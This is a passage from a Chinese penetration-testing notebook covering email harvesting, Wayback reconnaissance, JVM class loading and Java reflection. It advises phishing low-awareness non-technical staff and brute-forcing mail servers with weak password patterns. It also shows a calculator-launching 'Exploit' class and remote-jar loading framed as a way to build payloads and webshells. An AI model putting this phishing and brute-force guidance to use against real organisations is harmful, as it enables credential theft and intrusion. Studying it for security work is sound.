目前情况来看，通过web打点不一定是最优的方式，可以社工等方式同步进行；因此尽可能多的收集目标的邮箱，然后进行社工钓鱼可能大有突破 [!TIP] 实际过程中，我们可以尽可能的把收集到疑似网络管理员、运维人员、安全部门的人员提取出来，这些人单独写邮件或者不发，因为这些人安全意识相对较高，容易打草惊蛇，我们需要对一些非技术员工安全意识薄弱的人下手，挑软柿子捏。 寻找目标邮箱入口 [!NOTE] 目标为开放的邮服端口或web邮箱入口 通过扫描C段 拿到目标后，先要先从MX记录域名找到他的真实ip地址（某些目标可能是第三方邮件服务器，这种情况mx记录就没有参考价值了） *　然后针对这个ip地址的C段进行扫描（25、109、110、143、465、995、993端口） 通过子域名 主要是利用一些子域名收集工具，如：Subdomainbrute、ksubdomain、Oneforall、Sublist3r、TeeMO、LangSrcCurise、Layer挖掘机等 通过搜索引擎 1、Google Hacking语法 site:target.com intitle:\"Outlook Web App\" site:target.com intitle:\"mail\" site:target.com intitle:\"邮箱\" 2、网络空间搜索引擎 Shodan fofa zoomeye hostname:163.com http.title:\"邮箱\" 在线平台收集 0、Google Hacking 万金油 [!WARNING] 可能结果不全也没那么多，影响的内容也比较多 1、https://app.snov.io/ 好用，真的好用，结果也多，支持API的方式调用，也可以批量验证邮箱 2、https://phonebook.cz/（还可以收集域名、URL） 3、https://hunter.io/ [!NOTE] 需要注册，需要绑定手机号，不然会打码，支持浏览器插件，好用 4、http://www.skymem.info/ 5、https://www.email-format.com/i/search/ 工具收集 https://github.com/laramies/theHarvester brew install theHarvester theHarvester -h usage: theharvester [-h] -d DOMAIN [-l LIMIT] [-S START] [-g] [-p] [-s] [--screenshot SCREENSHOT] [-v] [-e DNS_SERVER] [-t DNS_TLD] [-r] [-n] [-c] [-f FILENAME] [-b SOURCE] theHarvester is used to gather open source intelligence (OSINT) on a company or domain. optional arguments: -h, --help show this help message and exit -d DOMAIN, --domain DOMAIN Company name or domain to search. -l LIMIT, --limit LIMIT Limit the number of search results, default=500. -S START, --start START Start with result number X, default=0. -g, --google-dork Use Google Dorks for Google search. -p, --proxies Use proxies for requests, enter proxies in proxies.yaml. -s, --shodan Use Shodan to query discovered hosts. --screenshot SCREENSHOT Take screenshots of resolved domains specify output directory: --screenshot output_directory -v, --virtual-host Verify host name via DNS resolution and search for virtual hosts. -e DNS_SERVER, --dns-server DNS_SERVER DNS server to use for lookup. -t DNS_TLD, --dns-tld DNS_TLD Perform a DNS TLD expansion discovery, default False. -r, --take-over Check for takeovers. -n, --dns-lookup Enable DNS server lookup, default False. -c, --dns-brute Perform a DNS brute force on the domain. -f FILENAME, --filename FILENAME Save the results to an XML and JSON file. -b SOURCE, --source SOURCE anubis, baidu, bing, binaryedge, bingapi, bufferoverun, censys, certspotter, crtsh, dnsdumpster, duckduckgo, fullhunt, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, n45ht, omnisint, otx, pentesttools, projectdiscovery, qwant, rapiddns, rocketreach, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo, zoomeye 验证邮箱 在收集邮箱之后，我们可以对邮箱进行存活性验证，检测目标邮箱是否存在被弃用的情况（离职，职位调动等）。 通过mailtester.com [!NOTE] https://mailtester.com/ 需要注册，支持使用临时邮箱注册 使用verifyemail [!NOTE] https://github.com/Tzeross/verifyemail 好用，真的好用，就是需要自己改代码，对不懂的小伙伴可能不是很友好哈哈哈 后面有时间自己改下 python3 verifyemail.py 使用snov.io [!NOTE] https://app.snov.io/verify/individual-emails 刚才我们也提到了这个网站，确实挺好用，就是不知道数量多了收费不 邮箱爆破 [!NOTE] 这种方式的弱口令爆破只适用于目标企业自己的邮件服务器如owa等 像百度腾讯阿里网易等第三方邮箱不优先考虑 SMTP协议爆破：medusa、hydra、SNETCracker、APT34组织 owa爆破工具等... 网页邮箱爆破：burpsuite等... [!TIP] 常用易忽略弱口令： 公司简称+年份；如 zgdx2022 用户名+123；如 wg123 抛砖引玉，自己多想想 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:42:12 "},"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/07.历史页面.html":{"url":"个人知识库/01.渗透测试/01.信息收集/3.敏感信息收集/07.历史页面.html","title":"07.历史页面","keywords":"","body":" 介绍 推荐网站 推荐工具 介绍 wayback会记录网站版本更迭，可以获取到之前版本的网站，可能会找到一些后来删除的敏感资产信息，或者一些漏洞 推荐网站 [!NOTE] https://web.archive.org/ 好用，真的好用 2010年qq网qq.com 推荐工具 waybackurls:https://github.com/tomnomnom/waybackurls # 安装 go get github.com/tomnomnom/waybackurls # 使用举例 cat domains.txt | waybackurls > urls Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-06 14:20:21 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/01.JVM类加载机制.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/01.JVM类加载机制.html","title":"01.JVM类加载机制","keywords":"","body":" 类的加载机制 类的生命周期 加载：查找并加载类的二进制数据 校验：确保被加载的类的正确性 准备：为类的静态变量分配内存，并将其初始化为默认值 解析：把类中的符号引用转换为直接引用 初始化：对类的静态变量，静态代码块执行初始化操作 类初始化的步骤 触发类初始化的时机 以下几种情况不会执行类初始化 使用 卸载 类加载器 什么是类加载器 类加载器的层次 启动类加载器(Bootstrap ClassLoader) 扩展类加载器(Extension ClassLoader) 应用程序类加载器(Application ClassLoader) 注意 类加载的几种方式 JVM类加载机制 全盘负责 父类委托 缓存机制 双亲委派机制 类的双亲委派机制 双亲委派机制的工作流程 双亲委派机制的优点 双亲委派机制代码实现 类加载器的核心方法 自定义类加载器 URLClassLoader 参考 类的加载机制 Java是一个依赖于JVM(Java虚拟机)实现的跨平台的开发语言。Java程序在运行前需要先编译成class文件，Java类初始化的时候会调用 java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法(defineClass0/1/2)来定义一个java.lang.Class实例。 Java虚拟机把描述类的数据从Class文件加载到内存，并对数据进行校验、转换解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这个过程被称作虚拟机的类加载机制。 类的生命周期 类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载，校验，准备，解析，初始化,使用,卸载这7个阶段.其中其中验证、准备、解析3个部分统称为链接。 加载、校验、准备、初始化和卸载这五个阶段的顺序是确定的，类型的加载过程必须按照这种顺序按部就班地开始，而解析阶段则不一定：它在某些情况下可以在初始化阶段之后再开始，这是为了支持Java语言的运行时绑定特性（也称为动态绑定或晚期绑定） 注意，这里的几个阶段是按顺序开始，而不是按顺序进行或完成，因为这些阶段通常都是互相交叉地混合进行的，通常在一个阶段执行的过程中调用或激活另一个阶段。 加载：查找并加载类的二进制数据 在加载阶段，虚拟机需要完成以下3件事情： 1）通过一个类的全限定名来获取定义此类的二进制字节流。 2）将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。 3）在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口。 校验：确保被加载的类的正确性 验证是连接阶段的第一步，这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。验证阶段大致会完成4个阶段的检验动作: 文件格式验证: 验证字节流是否符合Class文件格式的规范；例如: 是否以0xCAFEBABE开头、主次版本号是否在当前虚拟机的处理范围之内、常量池中的常量是否有不被支持的类型。 元数据验证：对字节码描述的信息进行语义分析(注意: 对比javac编译阶段的语义分析)，以保证其描述的信息符合Java语言规范的要求；例如: 这个类是否有父类，除了java.lang.Object之外。 字节码验证：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。 符号引用验证：确保解析动作能正确执行。 验证阶段是非常重要的，但不是必须的，它对程序运行期没有影响，如果所引用的类经过反复验证，那么可以考虑采用-Xverifynone参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间。 准备：为类的静态变量分配内存，并将其初始化为默认值 准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些变量所使用的内存都将在方法区中进行分配。 该阶段的注意事项： 这时候进行内存分配的仅包括类变量（被static修饰的变量），而不包括实例变量，实例变量将会在对象实例化时随着对象一起分配在Java堆中。 这里所设置的初始值通常情况下是数据类型默认的零值(如0、0L、null、false等)，而不是被在Java代码中被显式地赋予的值。 比如：假设一个类变量的定义为: public static int value = 3；那么变量value在准备阶段过后的初始值为0，而不是3，因为这时候尚未开始执行任何Java方法，而把value赋值为3的put static指令是在程序编译后，存放于类构造器()方法之中的，所以把value赋值为3的动作将在初始化阶段才会执行。 对基本数据类型来说，对于类变量(static)和全局变量，如果不显式地对其赋值而直接使用，则系统会为其赋予默认的零值，而对于局部变量来说，在使用前必须显式地为其赋值，否则编译时不通过。 对于同时被static和final修饰的常量，必须在声明的时候就为其显式地赋值，否则编译时不通过；而只被final修饰的常量则既可以在声明时显式地为其赋值，也可以在类初始化时显式地为其赋值，总之，在使用前必须为其显式地赋值，系统不会为其赋予默认零值。 对于引用数据类型reference来说，如数组引用、对象引用等，如果没有对其进行显式地赋值而直接使用，系统都会为其赋予默认的零值，即null。 如果在数组初始化时没有对数组中的各元素赋值，那么其中的元素将根据对应的数据类型而被赋予默认的零值。 如果类字段的字段属性表中存在ConstantValue属性，即同时被final和static修饰，那么在准备阶段变量value就会被初始化为ConstValue属性所指定的值。 假设上面的类变量value被定义为: public static final int value = 3；编译时Javac将会为value生成ConstantValue属性，在准备阶段虚拟机就会根据ConstantValue的设置将value赋值为3。我们可以理解为static final常量在编译期就将其结果放入了调用它的类的常量池中 解析：把类中的符号引用转换为直接引用 解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程，解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行。符号引用就是一组符号来描述目标，可以是任何字面量。 直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。 初始化：对类的静态变量，静态代码块执行初始化操作 初始化，为类的静态变量赋予正确的初始值，JVM负责对类进行初始化，主要对类变量进行初始化。在Java中对类变量进行初始值设定有两种方式: 声明类变量是指定初始值 使用静态代码块为类变量指定初始值 类初始化的步骤 假如这个类还没有被加载和连接，则程序先加载并连接该类 假如该类的直接父类还没有被初始化，则先初始化其直接父类 假如类中有初始化语句，则系统依次执行这些初始化语句 触发类初始化的时机 只有当对类的主动使用的时候才会导致类的初始化，类的主动使用包括以下六种: 使用new关键字实例化对象的时候。 读取或设置一个类型的静态字段（被final修饰、已在编译期把结果放入常量池的静态字段除外）的时候。 调用一个类型的静态方法的时候。 使用java.lang.reflect包的方法对类型进行反射调用的时候，如果类型没有进行过初始化，则需要先触发其初始化。 当初始化类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。 当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先初始化这个主类。 以下几种情况不会执行类初始化 通过子类引用父类的静态字段，只会触发父类的初始化，而不会触发子类的初始化。 定义对象数组，不会触发该类的初始化。 常量在编译期间会存入调用类的常量池中，本质上并没有直接引用定义常量的类，不会触发定义常量所在的类。 通过类名获取 Class 对象，不会触发类的初始化。 通过 Class.forName 加载指定类时，如果指定参数 initialize 为 false 时，也不会触发类初始化，其实这个参数是告诉虚拟机，是否要对类进行初始化。 通过 ClassLoader 默认的 loadClass 方法，也不会触发初始化动作。 使用 类访问方法区内的数据结构的接口， 对象是Heap区的数据。 卸载 Java虚拟机将结束生命周期的几种情况 执行了System.exit()方法 程序正常执行结束 程序在执行过程中遇到了异常或错误而异常终止 由于操作系统出现错误而导致Java虚拟机进程终止 类加载器 什么是类加载器 虚拟机设计团队把类加载阶段中的==通过一个类的全限定名来获取描述此类的二进制字节流==这个动作放到Java虚拟机外部去实现，以便让应用程序自己决定如何去获取所需要的类。 实现这个动作的代码模块称为类加载器。 一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。 对于任意一个类，都需要由加载它的类加载器和这个类本身一同确立其在 Java 虚拟机的唯一性，每个类加载器都拥有一个独立的类命名空间。也就是说：比较两个类是否「相等」，要在这两个类是由同一个类加载器加载的前提下才有意义，否则，即使这两个类来源于同一个 Class 文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相等。 类加载器的层次 从Java虚拟机的角度来讲，只存在两种不同的类加载器： 一种是启动类加载器（Bootstrap ClassLoader），这个类加载器使用C++语言实现，是虚拟机自身的一部分，负责加载JDK中的核心类库，类似于操作系统启动时的boot loader 另一种就是所有其他的类加载器，这些类加载器都由Java语言实现，独立于虚拟机外部，并且全都继承自抽象类java.lang.ClassLoader。 从Java开发人员的角度来看，类加载器还可以划分得更细致一些，绝大部分Java程序都会使用到以下3种系统提供的类加载器: 启动类加载器(Bootstrap ClassLoader) 启动类加载器是最底层的类加载器，是JVM的一部分，它是由C++语言实现的，且没有父加载器，也没有继承java.lang.ClassLodaer类。 这个类加载器负责将存放在＜JAVA_HOME＞/lib和＜JAVA_HOME＞/jre/lib目录中的，或者被-Xbootclasspath参数所指定的路径中的，并且是虚拟机识别的类库加载到虚拟机内存中。（按照文件名识别，如tools.jar、rt.jar，名字不符合的类库即使放在lib目录中也不会被加载） 处于安全考虑，根类加载器只加载java、javax、sun开头的类。 public class TestClassLoader { public static void main(String[] args) { System.out.println(java.lang.String.class.getClassLoader()); // null } } 扩展类加载器(Extension ClassLoader) 这个加载器由sun.misc.Launcher$ExtClassLoader实现，它负责加载＜JAVA_HOME＞/lib/ext和＜JAVA_HOME＞/jre/lib/ext目录中的，或者被java.ext.dirs系统变量所指定的路径中的所有类库，开发者可以直接使用扩展类加载器。 public class TestClassLoader { public static void main(String[] args) { System.out.println(com.sun.nio.zipfs.ZipFileStore.class.getClassLoader()); // sun.misc.Launcher$ExtClassLoader@6bc168e5 } } 应用程序类加载器(Application ClassLoader) 这个类加载器由sun.misc.Launcher$AppClassLoader来实现。 由于应用程序类加载器是ClassLoader类中的getSystemClassLoader()方法的返回值，所以有些场合中也称它为“系统类加载器”。 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); 它负责加载用户类路径（ClassPath）上所有的类库，开发者同样可以直接在代码中使用这个类加载器。如果应用程序中没有自定义过自己的类加载器，一般情况下这个就是程序中默认的类加载器。 public class TestClassLoader { public static void main(String[] args) { System.out.println(TestClassLoader.class.getClassLoader()); // sun.misc.Launcher$AppClassLoader@18b4aac2 } } 我们的应用程序都是由这3种类加载器互相配合进行加载的，如果有必要，还可以加入自己定义的类加载器。 注意 某些时候我们获取一个类的类加载器时候可能会返回一个null值，如:java.io.File.class.getClassLoader()将返回一个null对象，因为java.io.File类在JVM初始化的时候会被Bootstrap ClassLoader(引导类加载器)加载(该类加载器实现于JVM层，采用C++编写)，我们在尝试获取被Bootstrap ClassLoader类加载器所加载的类的ClassLoader时候都会返回null。 import java.io.File; public class TestClassLoader { public static void main(String[] args) { System.out.println(File.class.getClassLoader()); } } 类加载的几种方式 Java类加载方式分为显式和隐式,显式即我们通常使用Java反射或者ClassLoader来动态加载一个类对象，而隐式指的是类名.方法名()或new类实例。显式类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。 命令行启动应用时候由JVM初始化加载 通过Class.forName()方法动态加载 通过ClassLoader.loadClass()方法动态加载 public class TestClassLoader { public static void main(String[] args) throws ClassNotFoundException { // 默认会执行初始化静态代码块 Class.forName(\"Test\"); // 使用应用程序类加载器来加载类Test，不会执行初始化静态代码块 ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); appClassLoader.loadClass(\"Test\"); //forName指定了classLoader，initialize为false不会执行初始化静态代码块，为true则会执行 Class.forName(\"Test\", false, appClassLoader); } } class Test { static { System.out.println(\"静态方法被执行了\"); } } 分别运行上面几种类加载方式，可以看出来Class.forName()和ClassLoader.loadClass()的区别 Class.forName(): 将类的.class文件加载到jvm中之外，还会对类进行解释，执行类中的static块； ClassLoader.loadClass(): 只干一件事情，就是将.class文件加载到jvm中，不会执行static中的内容,只有在newInstance()才会去执行static块; Class.forName(name, initialize, loader)带参函数也可控制是否加载static块。并且只有调用了newInstance()方法采用调用构造函数，创建类的对象。 JVM类加载机制 全盘负责 当一个类加载器负责加载某个Class时，该Class所依赖的和引用的其他Class也将由该类加载器负责载入，除非显示使用另外一个类加载器来载入。 父类委托 先让父类加载器试图加载该类，只有在父类加载器无法加载该类时才尝试从自己的类路径中加载该类。 缓存机制 缓存机制将会保证所有加载过的Class都会被缓存，当程序中需要使用某个Class时，类加载器先从缓存区寻找该Class，只有缓存区不存在，系统才会读取该类对应的二进制数据，并将其转换成Class对象，存入缓存区。这就是为什么修改了Class后，必须重启JVM，程序的修改才会生效。 双亲委派机制 双亲委派模型的工作过程是：如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求最终都应该传送到最顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。 类的双亲委派机制 上图展示的类加载器之间的这种层次关系，称为类加载器的双亲委派模型（Parents Delegation Model）。 双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应当有自己的父类加载器。 这里类加载器之间的父子关系一般不会以继承（Inheritance）的关系来实现，而是都使用组合（Composition）关系来复用父加载器的代码。 类加载器的双亲委派模型在JDK1.2期间被引入并被广泛应用于之后几乎所有的Java程序中，但它并不是一个强制性的约束模型，而是Java设计者推荐给开发者的一种类加载器实现方式. 双亲委派机制的工作流程 如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一个层次的类加载器都是如此，因此所有的加载请求最终都应该传送到最顶层的启动类加载器中，只有当父加载器反馈自己无法完成这个加载请求（它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。 举例： 当AppClassLoader加载一个class时，它首先不会自己去尝试加载这个类，而是把类加载请求委派给父类加载器ExtClassLoader去完成。 当ExtClassLoader加载一个class时，它首先也不会自己去尝试加载这个类，而是把类加载请求委派给BootStrapClassLoader去完成。 如果BootStrapClassLoader加载失败(例如在$JAVA_HOME/jre/lib里未查找到该class)，会使用ExtClassLoader来尝试加载； 若ExtClassLoader也加载失败，则会使用AppClassLoader来加载，如果AppClassLoader也加载失败，则会报出异常ClassNotFoundException。 代码举例： /** * 输出结果： * sun.misc.Launcher$AppClassLoader@18b4aac2 * sun.misc.Launcher$ExtClassLoader@61064425 * null */ public class TestClassLoader { public static void main(String[] args) { ClassLoader loader= TestClassLoader.class.getClassLoader(); while(loader!=null){ System.out.println(loader); loader=loader.getParent(); } System.out.println(loader); } } 双亲委派机制的优点 使用双亲委派模型来组织类加载器之间的关系，有一个显而易见的好处就是Java类随着它的类加载器一起具备了一种带有优先级的层次关系。 例如类java.lang.Object，它存放在rt.jar之中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的启动类加载器进行加载，因此Object类在程序的各种类加载器环境中都是同一个类。相反，如果没有使用双亲委派模型，由各个类加载器自行去加载的话，如果用户自己编写了一个称为java.lang.Object的类，并放在程序的ClassPath中，那系统中将会出现多个不同的Object类，Java类型体系中最基础的行为也就无法保证，应用程序也将会变得一片混乱。 所以它的优点 系统类防止内存中出现多份同样的字节码 保证Java程序安全稳定运行 双亲委派机制代码实现 代码实现主要在ClassLoader类的loadClass函数中 由此也可看出，我们如果要自定义一个类加载器，那么需要重写的就是findClass()方法，而不是loadClass()方法 类加载器的核心方法 loadClass(加载指定的Java类) findClass(查找指定的Java类) findLoadedClass(查找JVM已经加载过的类) defineClass(定义一个Java类) resolveClass(链接指定的Java类) 自定义类加载器 通常情况下，我们都是直接使用系统类加载器。但是有的时候，我们也需要自定义类加载器。比如应用是通过网络来传输Java类的字节码，为保证安全性，这些字节码经过了加密处理，这时系统类加载器就无法对其进行加载，这样则需要自定义类加载器来实现。 利用自定义类加载器我们可以在webshell中实现加载并调用自己编译的类对象，比如本地命令执行漏洞调用自定义类字节码的native方法绕过RASP检测，也可以用于加密重要的Java类字节码(只能算弱加密了)。 自定义类加载器一般都是继承自ClassLoader类，从上面对loadClass方法来分析来看，我们只需要重写 findClass 方法即可。 注意： 这里传递的文件名需要是类的全限定性名称，即com.test.Test格式的，因为 defineClass 方法是按这种格式进行处理的。 最好不要重写loadClass方法，因为这样容易破坏双亲委托模式。 这类Test类本身可以被 AppClassLoader 类加载，因此我们不能把com/test/Test 放在类路径下。否则，由于双亲委托机制的存在，会直接导致该类由 AppClassLoader 加载，而不会通过我们自定义类加载器来加载。 举例：此处我通过本地class文件的字节码来加载class 需要加载的class源码 import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit{ public Exploit() throws Exception { Process p = Runtime.getRuntime().exec(new String[]{\"open\", \"-na\", \"Calculator\"}); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) { System.out.println(line); } p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void main(String[] args) throws Exception { } } 编译成class文件 javac Exploit.java JVM执行的其实就是javap命令生成的字节码(ByteCode)。 编写TestClassLoader加载这个class import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; public class TestClassLoader extends ClassLoader { /** * 重写了findClass方法 */ @Override protected Class findClass(String name) throws ClassNotFoundException { byte[] bytes = new byte[0]; try { bytes = loadClassData(); } catch (IOException e) { e.printStackTrace(); } if (bytes == null) { throw new ClassNotFoundException(name); } else { return defineClass(\"Exploit\", bytes, 0, bytes.length); } } /** * 给class文件以字节码的形式返回 */ private byte[] loadClassData() throws IOException { String fileName = \"/Users/d4m1ts/d4m1ts/tools/exp/exphub/fastjson/Exploit.class\"; try { InputStream ins = new FileInputStream(fileName); ByteArrayOutputStream baos = new ByteArrayOutputStream(); int bufferSize = 1024; byte[] buffer = new byte[bufferSize]; int length = 0; while ((length = ins.read(buffer)) != -1) { baos.write(buffer, 0, length); } return baos.toByteArray(); } catch (IOException e) { e.printStackTrace(); } return null; } public static void main(String[] args) throws ClassNotFoundException, IllegalAccessException, InstantiationException { TestClassLoader testClassLoader = new TestClassLoader(); // loadClass的时候上层的ClassLoader都找不到对应的类，所以会调用它自己的findClass去加载类 Class test = testClassLoader.loadClass(\"Exploit\"); System.out.println(test.getClassLoader()); // 申请实例 test.newInstance(); } } URLClassLoader URLClassLoader继承了ClassLoader，URLClassLoader提供了加载远程资源的能力，在写漏洞利用的payload或者webshell的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。 远程类我们还是使用我们自定义类加载器中编译的Exploit.class吧 下方命令给class打包成jar，也可以直接压缩为zip再改后缀 jar cvf Exploit.jar Exploit.class 编写远程加载jar代码 import java.io.IOException; import java.net.URL; import java.net.URLClassLoader; public class TestClassLoader { public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException { // 也可以搭建个web服务器用http协议来远程加载 URL url = new URL(\"file:/Users/d4m1ts/d4m1ts/tools/exp/exphub/fastjson/Exploit.jar\"); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}); Class exploit = urlClassLoader.loadClass(\"Exploit\"); exploit.newInstance(); } } 参考 关于JVM类加载机制，看这一篇就够了 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2021-12-25 18:51:59 "},"个人知识库/02.代码审计/01.Java安全/1.审计基础/02.Java反射机制.html":{"url":"个人知识库/02.代码审计/01.Java安全/1.审计基础/02.Java反射机制.html","title":"02.Java反射机制","keywords":"","body":" 反射 何为反射 获取class的Class实例 方法一 方法二 方法三 方法四 比较 获取基本信息 小结 访问字段 获取字段的一些信息 获取字段的值 修改字段的值 小结 调用方法（‼️） 获取方法 调用方法 小结 调用构造方法 举例 小结 获取继承关系 获取父类class和interface 小结 动态代理 过程 小结 反射 何为反射 反射就是Reflection，Java的反射是指程序在运行期可以拿到一个对象的所有信息。即Java反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。 class（包括interface）的本质是数据类型（Type） 而class是由JVM在执行过程中动态加载的。JVM在第一次读取到一种class类型时，将其加载进内存。 每加载一种class，JVM就为其创建一个Class类型的实例，并关联起来。注意：这里的Class类型是一个名叫Class的class。它长这样： public final class Class { private Class() {} } 以String类为例，当JVM加载String类时，它首先读取String.class文件到内存，然后，为String类创建一个Class实例并关联起来： Class cls = new Class(String); 这个Class实例是JVM内部创建的，如果我们查看JDK源码，可以发现Class类的构造方法是private，只有JVM能创建Class实例，我们自己的Java程序是无法创建Class实例的。 所以，JVM持有的每个Class实例都指向一个数据类型（class或interface） 由于JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息。 这种通过Class实例获取class信息的方法称为反射（Reflection）。 获取class的Class实例 获取一个class的Class实例，有4个方法： 方法一 直接通过一个class的静态变量class获取： Class cls = String.class; 方法二 如果我们有一个实例变量，可以通过该实例变量提供的getClass()方法获取： String s = \"Hello\"; Class cls = s.getClass(); 方法三 如果知道一个class的完整类名，可以通过静态方法Class.forName()获取： Class cls = Class.forName(\"java.lang.String\"); 方法四 利用classLoader Class cls = ClassLoader.getSystemClassLoader().loadClass(\"java.lang.Runtime\") 比较 因为Class实例在JVM中是唯一的，所以，上述方法获取的Class实例是同一个实例。可以用==比较两个Class实例： Class cls1 = String.class; String s = \"Hello\"; Class cls2 = s.getClass(); boolean sameClass = cls1 == cls2; // true 获取基本信息 获取class的基本信息 package org.example; import java.util.ArrayList; public class App{ public static void main(String[] args) { Class cls1 = String.class; ArrayList a = new ArrayList(); Class cls2 = a.getClass(); printInfo(cls1); printInfo(cls2); } static void printInfo(Class cls){ System.out.println(\"Class name : \" + cls.getName()); System.out.println(\"Simple name: \" + cls.getSimpleName()); if (cls.getPackage() != null) { System.out.println(\"Package name: \" + cls.getPackage().getName()); } System.out.println(\"is interface: \" + cls.isInterface()); System.out.println(\"is enum: \" + cls.isEnum()); System.out.println(\"is array: \" + cls.isArray()); System.out.println(\"is primitive: \" + cls.isPrimitive()); } } 小结 JVM为每个加载的class及interface创建了对应的Class实例来保存class及interface的所有信息； 获取一个class对应的Class实例后，就可以获取该class的所有信息； 通过Class实例获取class信息的方法称为反射（Reflection）； JVM总是动态加载class，可以在运行期根据条件来控制加载class。 访问字段 对任意的一个Object实例，只要我们获取了它的Class，就可以获取它的一切信息。 我们先看看如何通过Class实例获取字段信息。 获取字段的一些信息 import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { Class ot = OtherTest.class; System.out.println(Arrays.toString(ot.getFields())); // 获取所有public的field（包括父类） System.out.println(Arrays.toString(ot.getDeclaredFields())); // 获取当前类的所有field（不包括父类） System.out.println(ot.getField(\"a\")); // 根据字段名获取某个 public 的field（包括父类） System.out.println(ot.getDeclaredField(\"b\")); // 根据字段名获取当前类的某个field（不包括父类） System.out.println(ot.getField(\"a\").getName()); // 字段名称 System.out.println(ot.getField(\"a\").getType()); // 字段类型，也是一个Class实例 System.out.println(ot.getField(\"a\").getModifiers()); // 修饰符 } } class OtherTest extends emmTest{ public int a = 5; private int b; } class emmTest { public float cc; } [public int OtherTest.a, public float emmTest.cc] [public int OtherTest.a, private int OtherTest.b] public int OtherTest.a private int OtherTest.b a int 1 获取字段的值 先获取Class实例，再获取Field实例，然后，用Field.get(Object)获取指定实例的指定字段的值。 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 Object value = f.get(ot); // 从对象ot中获取值，因为所有的同类型class共用一个Class，所以获取内容要选定对象 System.out.println(value); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } } // 输出 haha 反射是一种非常规的用法，使用反射，首先代码非常繁琐，其次，它更多地是给工具或者底层框架来使用，目的是在不知道目标实例任何信息的情况下，获取特定字段的值。 此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。 修改字段的值 package org.example; import java.lang.reflect.Field; public class App { public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException { OtherTest ot = new OtherTest(\"haha\"); Class cls = ot.getClass(); Field f = cls.getDeclaredField(\"name\"); f.setAccessible(true); // 设置访问权限，一律为true，不然不能访问 private 的 f.set(ot, \"modify\"); // 反射修改值 System.out.println(ot.getName()); } } class OtherTest { private String name; public OtherTest(String name) { this.name = name; } public String getName() { return name; } } 小结 Java的反射API提供的Field类封装了字段的所有信息： 通过Class实例的方法可以获取Field实例：getField()，getFields()，getDeclaredField()，getDeclaredFields()； 通过Field实例可以获取字段信息：getName()，getType()，getModifiers()； 通过Field实例可以读取或设置某个对象的字段，如果存在访问限制，要首先调用setAccessible(true)来访问非public字段。 通过反射读写字段是一种非常规方法，它会破坏对象的封装。 调用方法（‼️） 获取方法 通过Class实例获取所有Method信息。Class类提供了以下几个方法来获取Method import java.util.Arrays; public class Test{ public static void main(String[] args) throws NoSuchMethodException { Class cls = OtherTest.class; // Class cls = ot.getClass(); System.out.println(Arrays.toString(cls.getMethods())); // 获取所有public的Method（包括父类） 